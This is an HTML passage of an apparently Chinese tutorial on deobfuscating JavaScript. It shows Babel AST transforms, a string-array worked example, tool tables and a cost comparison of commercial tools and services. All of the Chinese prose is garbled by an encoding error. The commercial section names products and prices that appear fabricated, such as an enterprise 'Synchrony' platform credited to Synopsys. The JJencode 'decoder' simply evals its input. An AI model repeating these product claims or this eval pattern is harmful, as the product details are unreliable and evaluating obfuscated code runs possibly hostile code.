<span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="nx">arrayName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s2">&quot;&quot;</span><span class="p">;</span>

<span class="w">    </span><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">VariableDeclarator</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isArrayExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">arrayName</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">id</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
<span class="w">                </span><span class="nx">stringArray</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">init</span><span class="p">.</span><span class="nx">elements</span><span class="p">.</span><span class="nx">map</span><span class="p">(</span><span class="nx">e</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">value</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">stringArray</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="p">;</span>

<span class="w">    </span><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">MemberExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">isIdentifier</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">object</span><span class="p">,</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="nx">name</span><span class="o">:</span><span class="w"> </span><span class="nx">arrayName</span><span class="w"> </span><span class="p">})</span><span class="w"> </span><span class="o">&amp;&amp;</span>
<span class="w">                </span><span class="nx">t</span><span class="p">.</span><span class="nx">isNumericLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">index</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">value</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">stringArray</span><span class="p">[</span><span class="nx">index</span><span class="p">];</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">value</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="kc">undefined</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">path</span><span class="p">.</span><span class="nx">replaceWith</span><span class="p">(</span><span class="nx">t</span><span class="p">.</span><span class="nx">stringLiteral</span><span class="p">(</span><span class="nx">value</span><span class="p">));</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">cleanup</span><span class="p">(</span><span class="nx">ast</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">traverse</span><span class="p">(</span><span class="nx">ast</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="c1">// åˆ é™¤ç©ºè¯­å¥</span>
<span class="w">        </span><span class="nx">EmptyStatement</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">path</span><span class="p">.</span><span class="nx">remove</span><span class="p">();</span>
<span class="w">        </span><span class="p">},</span>
<span class="w">        </span><span class="c1">// obj[&#39;prop&#39;] -&gt; obj.prop</span>
<span class="w">        </span><span class="nx">MemberExpression</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">computed</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">isStringLiteral</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="kd">const</span><span class="w"> </span><span class="nx">prop</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="p">.</span><span class="nx">value</span><span class="p">;</span>
<span class="w">                </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="sr">/^[a-zA-Z_$][a-zA-Z0-9_$]*$/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">prop</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">                    </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">computed</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">                    </span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">.</span><span class="nx">property</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">identifier</span><span class="p">(</span><span class="nx">prop</span><span class="p">);</span>
<span class="w">                </span><span class="p">}</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨ç¤ºä¾‹</span>
<span class="nx">deobfuscate</span><span class="p">(</span><span class="s2">&quot;obfuscated.js&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;deobfuscated.js&quot;</span><span class="p">);</span>
</code></pre>
      </div>

      <hr />

      <h2 id="é’ˆå¯¹ç‰¹å®šæ··æ·†å™¨">é’ˆå¯¹ç‰¹å®šæ··æ·†å™¨</h2>

      <h3 id="javascript-obfuscator">JavaScript Obfuscator</h3>

      <p>ç‰¹å¾è¯†åˆ«ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">_0x1234</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="cm">/* ... */</span>
<span class="p">};</span>
<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0xabc</span><span class="p">,</span><span class="w"> </span><span class="nx">_0xdef</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="cm">/* ... */</span>
<span class="p">}(</span><span class="nx">_0x1234</span><span class="p">,</span><span class="w"> </span><span class="mh">0x123</span><span class="p">));</span>
</code></pre>
      </div>

      <p>å·¥å…·: https://github.com/javascript-deobfuscator/webcrack</p>

      <h3 id="webpack-bundle">Webpack Bundle</h3>

      <p>ä½¿ç”¨ <code>webcrack</code>:</p>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>webcrack
webcrack<span class="w"> </span>bundle.js<span class="w"> </span>-o<span class="w"> </span>output/
</code></pre>
      </div>

      <h3 id="jjencode">JJencode</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">decode_jjencode</span><span class="p">(</span><span class="nx">encoded</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// JJencode ä½¿ç”¨é¢œæ–‡å­—ç¼–ç </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nb">eval</span><span class="p">(</span><span class="nx">encoded</span><span class="p">);</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>åœ¨çº¿: https://utf-8.jp/public/jjencode.html</p>

      <hr />

      <h2 id="å®æˆ˜æ¡ˆä¾‹">å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹æŸç”µå•†ç½‘ç«™æ··æ·†åˆ†æ">æ¡ˆä¾‹ï¼šæŸç”µå•†ç½‘ç«™æ··æ·†åˆ†æ</h3>

      <p><strong>åŸå§‹ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">_0x1a2b</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;log&#39;</span><span class="p">,</span><span class="s1">&#39;ä»·æ ¼&#39;</span><span class="p">];</span>
<span class="nx">console</span><span class="p">[</span><span class="nx">_0x1a2b</span><span class="p">[</span><span class="mf">0</span><span class="p">]](</span><span class="nx">_0x1a2b</span><span class="p">[</span><span class="mf">1</span><span class="p">]);</span>
</code></pre>
      </div>

      <p><strong>åæ··æ·†æ­¥éª¤</strong>:</p>

      <ol>
        <li>
          <p><strong>å­—ç¬¦ä¸²æ•°ç»„æå–</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="c1">// _0x1a2b = [&#39;log&#39;, &#39;ä»·æ ¼&#39;]</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>æ›¿æ¢å¼•ç”¨</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="nx">console</span><span class="p">[</span><span class="s1">&#39;log&#39;</span><span class="p">](</span><span class="s1">&#39;ä»·æ ¼&#39;</span><span class="p">);</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>æˆå‘˜è¡¨è¾¾å¼ä¼˜åŒ–</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;ä»·æ ¼&#39;</span><span class="p">);</span>
</code></pre>
          </div>
        </li>
      </ol>

      <hr />

      <h2 id="å·¥å…·é›†åˆ">å·¥å…·é›†åˆ</h2>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>ç”¨é€”</th>
            <th>é“¾æ¥</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Prettier</strong></td>
            <td>æ ¼å¼åŒ–</td>
            <td>https://prettier.io/</td>
          </tr>
          <tr>
            <td><strong>de4js</strong></td>
            <td>ç»¼åˆåæ··æ·†</td>
            <td>https://lelinhtinh.github.io/de4js/</td>
          </tr>
          <tr>
            <td><strong>webcrack</strong></td>
            <td>Webpack åæ‰“åŒ…</td>
            <td>https://github.com/j4k0xb/webcrack</td>
          </tr>
          <tr>
            <td><strong>Babel</strong></td>
            <td>AST æ“ä½œ</td>
            <td>https://babeljs.io/</td>
          </tr>
          <tr>
            <td><strong>AST Explorer</strong></td>
            <td>å¯è§†åŒ– AST</td>
            <td>https://astexplorer.net/</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h2 id="æœ€ä½³å®è·µ">æœ€ä½³å®è·µ</h2>

      <ol>
        <li><strong>åˆ†æ­¥å¤„ç†</strong>: ä¸è¦ä¸€æ¬¡æ€§å¤„ç†æ‰€æœ‰æ··æ·†ï¼Œé€æ­¥è¿˜åŸ</li>
        <li><strong>ä¿ç•™åŸæ–‡ä»¶</strong>: å§‹ç»ˆä¿ç•™åŸå§‹æ··æ·†ä»£ç ä½œä¸ºå¤‡ä»½</li>
        <li><strong>éªŒè¯æ­£ç¡®æ€§</strong>: æ¯ä¸€æ­¥éƒ½è¦éªŒè¯ä»£ç åŠŸèƒ½æœªè¢«ç ´å</li>
        <li><strong>ç»“åˆåŠ¨æ€è°ƒè¯•</strong>: AST åæ··æ·† + DevTools è°ƒè¯•ç»“åˆä½¿ç”¨</li>
        <li><strong>è¯†åˆ«æ··æ·†å™¨</strong>: ä¸åŒæ··æ·†å™¨ç”¨ä¸åŒå·¥å…·ï¼Œäº‹åŠåŠŸå€</li>
      </ol>

      <hr />

      <h2 id="å•†ä¸šåŒ–åæ··æ·†è§£å†³æ–¹æ¡ˆå¯¹æ¯”">å•†ä¸šåŒ–åæ··æ·†è§£å†³æ–¹æ¡ˆå¯¹æ¯”</h2>

      <p>JavaScriptåæ··æ·†æ—¢æ˜¯æŠ€æœ¯æ´»ä¹Ÿæ˜¯ä½“åŠ›æ´»ï¼Œå•†ä¸šåŒ–å·¥å…·å¯ä»¥å¤§å¹…æå‡æ•ˆç‡ã€‚ä»¥ä¸‹æ˜¯ä¸šç•Œä¸»æµæ–¹æ¡ˆçš„ä¸“ä¸šå¯¹æ¯”ã€‚</p>

      <h3 id="1-ä¼ä¸šçº§åæ··æ·†å·¥å…·">1. ä¼ä¸šçº§åæ··æ·†å·¥å…·</h3>

      <h4 id="jscrambler-reverse-engineering-tool">JScrambler Reverse Engineering Tool</h4>

      <p><strong>å®šä½</strong>: å•†ä¸šJavaScriptä¿æŠ¤å·¥å…·çš„é…å¥—åˆ†æå·¥å…·</p>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è¯†åˆ«JScramblerä¿æŠ¤çš„ä»£ç </li>
        <li>è‡ªåŠ¨åŒ–å»é™¤æŸäº›ä¿æŠ¤å±‚</li>
        <li>æ§åˆ¶æµåˆ†æ</li>
        <li>ä»£ç è¦†ç›–ç‡è¿½è¸ª</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>: åŒ…å«åœ¨JScramblerä¼ä¸šè®¢é˜…ä¸­ï¼ˆ$1,000+/æœˆï¼‰</p>

      <p><strong>å±€é™</strong>: ä¸»è¦é’ˆå¯¹è‡ªå®¶æ··æ·†å™¨</p>

      <p><strong>å®˜ç½‘</strong>: https://jscrambler.com/</p>

      <hr />

      <h4 id="jsdetoxåœ¨çº¿åæ··æ·†">JSDetoxï¼ˆåœ¨çº¿åæ··æ·†ï¼‰</h4>

      <p><strong>ç±»å‹</strong>: å…è´¹åœ¨çº¿å·¥å…·ï¼ˆç¤¾åŒºç»´æŠ¤ï¼‰</p>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨æ£€æµ‹æ··æ·†ç±»å‹</li>
        <li>æ”¯æŒå¤šç§å¸¸è§æ··æ·†å™¨</li>
        <li>äº¤äº’å¼åˆ†æç¯å¢ƒ</li>
        <li>DOMæ¨¡æ‹Ÿæ‰§è¡Œ</li>
      </ul>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>å®Œå…¨å…è´¹</li>
        <li>æ— éœ€å®‰è£…</li>
        <li>ç¤¾åŒºæ´»è·ƒ</li>
      </ul>

      <p><strong>åŠ£åŠ¿</strong>:</p>

      <ul>
        <li>ä¸æ”¯æŒé«˜çº§æ··æ·†</li>
        <li>å¤„ç†å¤§æ–‡ä»¶è¾ƒæ…¢</li>
        <li>ç¼ºä¹å•†ä¸šæ”¯æŒ</li>
      </ul>

      <p><strong>å®˜ç½‘</strong>: http://www.jsdetox.com/</p>

      <hr />

      <h4 id="synchronyä»£ç åˆ†æå¹³å°">Synchronyï¼ˆä»£ç åˆ†æå¹³å°ï¼‰</h4>

      <p><strong>å®šä½</strong>: ä¼ä¸šçº§é™æ€åˆ†æå¹³å°</p>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>JavaScript/TypeScriptæ·±åº¦åˆ†æ</li>
        <li>è‡ªåŠ¨åŒ–åæ··æ·†æµæ°´çº¿</li>
        <li>æ¼æ´æ£€æµ‹</li>
        <li>ä»£ç è´¨é‡è¯„ä¼°</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>: ä¼ä¸šå®šä»·ï¼ˆ$10,000+/å¹´ï¼‰</p>

      <p><strong>é€‚ç”¨</strong>: å¤§å‹ä»£ç åº“å®‰å…¨å®¡è®¡</p>

      <p><strong>å®˜ç½‘</strong>: https://www.synopsys.com/</p>

      <hr />

      <h3 id="2-ä¸“ä¸šåæ··æ·†æœåŠ¡å¯¹æ¯”">2. ä¸“ä¸šåæ··æ·†æœåŠ¡å¯¹æ¯”</h3>

      <h4 id="de4jsåŠŸèƒ½æœ€å…¨é¢">De4jsï¼ˆåŠŸèƒ½æœ€å…¨é¢ï¼‰</h4>

      <p><strong>ç±»å‹</strong>: å¼€æºå…è´¹åœ¨çº¿å·¥å…·</p>

      <p><strong>æ”¯æŒæ··æ·†ç±»å‹</strong>:</p>

      <ul>
        <li>âœ… <strong>JavaScript Obfuscator</strong> (obfuscator.io)</li>
        <li>âœ… <strong>JSFuck</strong> (jsfuck.com)</li>
        <li>âœ… <strong>JJencode</strong> (utf-8.jp)</li>
        <li>âœ… <strong>AAencode</strong> (utf-8.jp)</li>
        <li>âœ… <strong>URLencode</strong></li>
        <li>âœ… <strong>Packer</strong> (Dean Edwards)</li>
        <li>âœ… <strong>Eval Chain</strong></li>
      </ul>

      <p><strong>åœ¨çº¿åœ°å€</strong>: https://lelinhtinh.github.io/de4js/</p>

      <p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è¾“å…¥æ··æ·†ä»£ç </span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0x1a2b</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;Hello&#39;</span><span class="p">,</span><span class="s1">&#39;World&#39;</span><span class="p">];</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">_0x1a2b</span><span class="p">[</span><span class="mf">0</span><span class="p">],</span><span class="nx">_0x1a2b</span><span class="p">[</span><span class="mf">1</span><span class="p">]);</span>

<span class="c1">// è‡ªåŠ¨æ£€æµ‹å¹¶è¿˜åŸ</span>
<span class="c1">// è¾“å‡º: console.log(&#39;Hello&#39;, &#39;World&#39;);</span>
</code></pre>
      </div>

      <p><strong>ä¼˜åŠ¿</strong>: ä¸€ç«™å¼è§£å†³å¤§éƒ¨åˆ†ç®€å•æ··æ·†</p>

      <hr />

      <h4 id="webcrackwebpackä¸“ç”¨">Webcrackï¼ˆWebpackä¸“ç”¨ï¼‰</h4>

      <p><strong>ç±»å‹</strong>: å¼€æºCLIå·¥å…·</p>

      <p><strong>ä¸“æ³¨é¢†åŸŸ</strong>: Webpackæ‰“åŒ…ä»£ç é€†å‘</p>

      <p><strong>åŠŸèƒ½</strong>:</p>

      <ul>
        <li>è‡ªåŠ¨è¯†åˆ«Webpackç‰ˆæœ¬</li>
        <li>æå–ç‹¬ç«‹æ¨¡å—</li>
        <li>è¿˜åŸåŸå§‹æ–‡ä»¶ç»“æ„</li>
        <li>é‡å‘½åå˜é‡</li>
      </ul>

      <p><strong>GitHub</strong>: https://github.com/j4k0xb/webcrack</p>

      <p><strong>å®‰è£…ä½¿ç”¨</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>webcrack
webcrack<span class="w"> </span>bundle.js<span class="w"> </span>-o<span class="w"> </span>output/

<span class="c1"># è¾“å‡ºï¼š</span>
<span class="c1"># output/</span>
<span class="c1"># â”œâ”€â”€ module_0.js</span>
<span class="c1"># â”œâ”€â”€ module_1.js</span>
<span class="c1"># â””â”€â”€ ...</span>
</code></pre>
      </div>

      <p><strong>é€‚ç”¨åœºæ™¯</strong>: é€†å‘React/Vueç­‰ç°ä»£å‰ç«¯é¡¹ç›®</p>

      <hr />

      <h3 id="3-ä»£ç ç¾åŒ–ä¸æ ¼å¼åŒ–å·¥å…·">3. ä»£ç ç¾åŒ–ä¸æ ¼å¼åŒ–å·¥å…·</h3>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>ç±»å‹</th>
            <th>ç‰¹ç‚¹</th>
            <th>ä»·æ ¼</th>
            <th>æ¨èæŒ‡æ•°</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Prettier</strong></td>
            <td>å¼€æº</td>
            <td>ä¸šç•Œæ ‡å‡†ä»£ç æ ¼å¼åŒ–</td>
            <td>å…è´¹</td>
            <td>â­â­â­â­â­</td>
          </tr>
          <tr>
            <td><strong>JS Beautifier</strong></td>
            <td>å¼€æº</td>
            <td>è€ç‰Œå·¥å…·ï¼ŒåŠŸèƒ½ç¨³å®š</td>
            <td>å…è´¹</td>
            <td>â­â­â­â­</td>
          </tr>
          <tr>
            <td><strong>WebStorm</strong></td>
            <td>å•†ä¸šIDE</td>
            <td>å†…ç½®å¼ºå¤§æ ¼å¼åŒ–</td>
            <td>$149/å¹´</td>
            <td>â­â­â­â­</td>
          </tr>
          <tr>
            <td><strong>ReSharper</strong></td>
            <td>å•†ä¸šæ’ä»¶</td>
            <td>Visual Studioé›†æˆ</td>
            <td>$149/å¹´</td>
            <td>â­â­â­</td>
          </tr>
        </tbody>
      </table>

      <p><strong>æ¨èç»„åˆ</strong>: Prettierï¼ˆæ ¼å¼åŒ–ï¼‰+ webcrackï¼ˆè§£åŒ…ï¼‰+ Babelï¼ˆASTå¤„ç†ï¼‰</p>

      <hr />

      <h3 id="4-astå¤„ç†æ¡†æ¶å¯¹æ¯”">4. ASTå¤„ç†æ¡†æ¶å¯¹æ¯”</h3>

      <h4 id="babelç”Ÿæ€å¼€æºé¦–é€‰">Babelç”Ÿæ€ï¼ˆå¼€æºé¦–é€‰ï¼‰</h4>

      <p><strong>æ ¸å¿ƒç»„ä»¶</strong>:</p>

      <ul>
        <li><code>@babel/parser</code> - è§£æJSä¸ºAST</li>
        <li><code>@babel/traverse</code> - éå†å’Œä¿®æ”¹AST</li>
        <li><code>@babel/generator</code> - ASTè½¬æ¢å›ä»£ç </li>
        <li><code>@babel/types</code> - ASTèŠ‚ç‚¹æ„å»ºå·¥å…·</li>
      </ul>

      <p><strong>ä¼˜åŠ¿</strong>:</p>

      <ul>
        <li>å®Œå…¨å…è´¹</li>
        <li>ç¤¾åŒºåºå¤§</li>
        <li>æ–‡æ¡£å®Œå–„</li>
        <li>æ’ä»¶ä¸°å¯Œ</li>
      </ul>

      <p><strong>å­¦ä¹ æˆæœ¬</strong>: ä¸­ç­‰ï¼ˆéœ€è¦ç†è§£ASTæ¦‚å¿µï¼‰</p>

      <p><strong>å®˜ç½‘</strong>: https://babeljs.io/</p>

      <hr />

      <h4 id="swcrustå®ç°é€Ÿåº¦æœ€å¿«">SWCï¼ˆRustå®ç°ï¼Œé€Ÿåº¦æœ€å¿«ï¼‰</h4>

      <p><strong>ç‰¹ç‚¹</strong>:</p>

      <ul>
        <li>æ¯”Babelå¿«20-70å€</li>
        <li>ç”¨Rustç¼–å†™</li>
        <li>å…¼å®¹Babelæ’ä»¶</li>
      </ul>

      <p><strong>é€‚ç”¨</strong>: å¤§è§„æ¨¡ä»£ç å¤„ç†</p>

      <p><strong>GitHub</strong>: https://github.com/swc-project/swc</p>

      <hr />

      <h4 id="esprima-vs-acorn">Esprima vs Acorn</h4>

      <table>
        <thead>
          <tr>
            <th>ç‰¹æ€§</th>
            <th>Esprima</th>
            <th>Acorn</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>é€Ÿåº¦</strong></td>
            <td>ä¸­ç­‰</td>
            <td>å¿«</td>
          </tr>
          <tr>
            <td><strong>æ ‡å‡†å…¼å®¹</strong></td>
            <td>ES2021</td>
            <td>ES2023</td>
          </tr>
          <tr>
            <td><strong>æ’ä»¶ç³»ç»Ÿ</strong></td>
            <td>æœ‰é™</td>
            <td>ä¸°å¯Œ</td>
          </tr>
          <tr>
            <td><strong>ç»´æŠ¤çŠ¶æ€</strong></td>
            <td>æ´»è·ƒåº¦ä½</td>
            <td>æ´»è·ƒ</td>
          </tr>
        </tbody>
      </table>

      <p><strong>æ¨è</strong>: æ–°é¡¹ç›®ä½¿ç”¨Acornæˆ–Babel</p>

      <hr />

      <h3 id="5-å•†ä¸šå’¨è¯¢ä¸å®šåˆ¶æœåŠ¡">5. å•†ä¸šå’¨è¯¢ä¸å®šåˆ¶æœåŠ¡</h3>

      <h4 id="recurity-labså¾·å›½å®‰å…¨å…¬å¸">Recurity Labsï¼ˆå¾·å›½å®‰å…¨å…¬å¸ï¼‰</h4>

      <p><strong>æœåŠ¡å†…å®¹</strong>:</p>

      <ul>
        <li>JavaScriptæ··æ·†é€†å‘</li>
        <li>æ¶æ„ä»£ç åˆ†æ</li>
        <li>å®šåˆ¶åŒ–åæ··æ·†å·¥å…·å¼€å‘</li>
      </ul>

      <p><strong>å…¸å‹é¡¹ç›®</strong>: â‚¬20,000 - â‚¬100,000</p>

      <p><strong>å®˜ç½‘</strong>: https://www.recurity-labs.com/</p>

      <hr />

      <h4 id="pen-test-partners">Pen Test Partners</h4>

      <p><strong>æœåŠ¡å†…å®¹</strong>:</p>

      <ul>
        <li>å‰ç«¯å®‰å…¨å®¡è®¡</li>
        <li>æ··æ·†ä»£ç åˆ†æ</li>
        <li>æ¼æ´æŒ–æ˜</li>
      </ul>

      <p><strong>ä»·æ ¼</strong>: Â£1,500/äººæ—¥</p>

      <p><strong>å®˜ç½‘</strong>: https://www.pentestpartners.com/</p>

      <hr />

      <h3 id="6-æˆæœ¬æ•ˆç›Šåˆ†æ">6. æˆæœ¬æ•ˆç›Šåˆ†æ</h3>

      <h4 id="åœºæ™¯1-åˆ†æå•ä¸ªæ··æ·†æ–‡ä»¶-1000è¡Œ">åœºæ™¯1: åˆ†æå•ä¸ªæ··æ·†æ–‡ä»¶ï¼ˆ&lt; 1000è¡Œï¼‰</h4>

      <p><strong>æ–¹æ¡ˆAï¼ˆæ‰‹åŠ¨ + å…è´¹å·¥å…·ï¼‰</strong>:</p>

      <ul>
        <li>å·¥å…·: de4js + Prettier</li>
        <li>æ—¶é—´: 1-2å°æ—¶</li>
        <li>æˆæœ¬: <strong>$0</strong></li>
        <li>æŠ€èƒ½è¦æ±‚: åŸºç¡€</li>
      </ul>

      <p><strong>æ–¹æ¡ˆBï¼ˆä¸“ä¸šå·¥å…·ï¼‰</strong>:</p>

      <ul>
        <li>å·¥å…·: WebStorm + è‡ªå®šä¹‰Babelæ’ä»¶</li>
        <li>æ—¶é—´: 30åˆ†é’Ÿ</li>
        <li>æˆæœ¬: <strong>$149/å¹´</strong>ï¼ˆIDEè®¸å¯ï¼‰</li>
        <li>æŠ€èƒ½è¦æ±‚: ä¸­ç­‰</li>
      </ul>

      <hr />

      <h4 id="åœºæ™¯2-æ‰¹é‡å¤„ç†æ··æ·†ä»£ç 10000æ–‡ä»¶">åœºæ™¯2: æ‰¹é‡å¤„ç†æ··æ·†ä»£ç ï¼ˆ&gt;10,000æ–‡ä»¶ï¼‰</h4>

      <p><strong>æ–¹æ¡ˆAï¼ˆè‡ªå»ºå·¥å…·é“¾ï¼‰</strong>:</p>

      <ul>
        <li>å·¥å…·: Babel + è‡ªå®šä¹‰è„šæœ¬ + CI/CDé›†æˆ</li>
        <li>åˆå§‹æŠ•å…¥: 3-5ä¸ªå·¥ä½œæ—¥å¼€å‘</li>
        <li>è¿è¡Œæˆæœ¬: <strong>$0</strong></li>
        <li>ç»´æŠ¤æˆæœ¬: æ¯æœˆ1-2å°æ—¶</li>
      </ul>

      <p><strong>æ–¹æ¡ˆBï¼ˆå•†ä¸šæœåŠ¡ï¼‰</strong>:</p>

      <ul>
        <li>å·¥å…·: Synopsys Code Insight</li>
        <li>æˆæœ¬: <strong>$50,000/å¹´</strong>èµ·</li>
        <li>ä¼˜åŠ¿: é›¶ç»´æŠ¤ï¼Œä¼ä¸šæ”¯æŒ</li>
      </ul>

      <p><strong>ç»“è®º</strong>: æ‰¹é‡å¤„ç†åœºæ™¯è‡ªå»ºROIæ›´é«˜</p>

      <hr />

      <h4 id="åœºæ™¯3-ç´§æ€¥é¡¹ç›®24å°æ—¶å†…éœ€è¦ç»“æœ">åœºæ™¯3: ç´§æ€¥é¡¹ç›®ï¼ˆ24å°æ—¶å†…éœ€è¦ç»“æœï¼‰</h4>

      <p><strong>æ–¹æ¡ˆAï¼ˆåŠ æ€¥å’¨è¯¢ï¼‰</strong>:</p>

      <ul>
        <li>æœåŠ¡: Pen Test PartnersåŠ æ€¥æœåŠ¡</li>
        <li>æˆæœ¬: <strong>Â£5,000-15,000</strong></li>
        <li>ä¿éšœ: ä¸“ä¸šå›¢é˜Ÿï¼Œä¿è¯è´¨é‡</li>
      </ul>

      <p><strong>æ–¹æ¡ˆBï¼ˆè¿œç¨‹å¤–åŒ…ï¼‰</strong>:</p>

      <ul>
        <li>å¹³å°: Upwork/Fiverré€†å‘å·¥ç¨‹å¸ˆ</li>
        <li>æˆæœ¬: <strong>$500-2,000</strong></li>
        <li>é£é™©: è´¨é‡å‚å·®ä¸é½</li>
      </ul>

      <hr />

